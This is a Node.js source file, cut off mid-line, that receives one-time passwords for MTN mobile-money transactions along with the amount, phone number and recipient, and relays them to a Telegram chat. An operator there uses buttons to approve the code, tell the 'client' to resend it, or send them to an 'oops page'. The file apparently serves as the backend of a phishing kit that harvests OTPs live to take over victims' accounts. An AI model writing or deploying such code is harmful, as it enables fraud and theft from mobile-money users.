// telegram-otp.js
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

// txRef -> { decision, messageId }
const pending = new Map();

function log(m) { console.log('[tg-otp]', m); }

async function sendMessage(text, keyboard) {
  if (!BOT_TOKEN || !CHAT_ID) throw new Error('Telegram not configured.');
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
    })
  });
  const data = await res.json();
  if (!data.ok) throw new Error('Telegram send failed: ' + (data.description || 'unknown'));
  return data.result;
}
async function answerCallback(cqId, text) {
  if (!BOT_TOKEN) return;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: cqId, text, show_alert: false })
  }).catch(() => {});
}
async function clearButtons(messageId) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId, reply_markup: { inline_keyboard: [] } })
  }).catch(() => {});
}

/* Handle Telegram button clicks (data prefix "otp_...") */
async function handleUpdate(update) {
  const cq = update && update.callback_query;
  if (!cq) return;
  const data = cq.data || '';
  const [action, txRef] = data.split(':');
  if (!action || !action.startsWith('otp_') || !txRef) return; // not ours

  const entry = pending.get(txRef);
  if (!entry) { await answerCallback(cq.id, 'Request already handled.'); return; }
  if (entry.decision !== 'pending') { await answerCallback(cq.id, 'Already ' + entry.decision + '.'); return; }

  const messageId = cq.message && cq.message.message_id;

  if (action === 'otp_approve') {
    entry.decision = 'approved';
    await answerCallback(cq.id, '✅ Approved — client continues.');
  } else if (action === 'otp_expired') {
    entry.decision = 'expired';
    await answerCallback(cq.id, '⏱ Code expired — client told to resend.');
  } else if (action === 'otp_inactive') {
    entry.decision = 'inactive';
    await answerCallback(cq.id, '⚠ Marked inactive — client sent to oops page.');
  } else {
    await answerCallback(cq.id, 'Unknown action.');
    return;
  }
  log(`tx ${txRef} → ${entry.decision}`);
  if (messageId) await clearButtons(messageId);
}

function registerRoutes(app) {
  /* OTP submitted by client → send to Telegram with 3 buttons */
  app.post('/api/verification/submit', async (req, res) => {
    try {
      const { tx, otp, am, cur, c, an, rn } = req.body || {};
      if (!tx || !otp) return res.status(400).json({ error: 'Missing tx or otp' });

      const existing = pending.get(tx);
      if (existing && existing.decision === 'pending') {
        return res.json({ ok: true, requestId: tx }); // already pending, ignore dup
      }

      pending.set(tx, { decision: 'pending', messageId: null });

      const safe = (v) => String(v == null ? '—' : v)
        .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

      const text =
        `<b>🔐 New MTN OTP submitted</b>\n\n` +
        `<b>Reference:</b> <code>${safe(tx)}</code>\n` +
        `<b>OTP:</b> <code>${safe(otp)}</code>\n` +
        `<b>Amount:</b> ${safe(cur)} ${safe(am)}\n` +
        `<b>Country:</b> ${safe(c)}\n` +
        `<b>Number:</b> ${safe(an)}\n` +
        `<b>Recipient:</b> ${safe(rn)}`;

      const keyboard = [[
        { text: '✅ Approve',        callback_data: `otp_
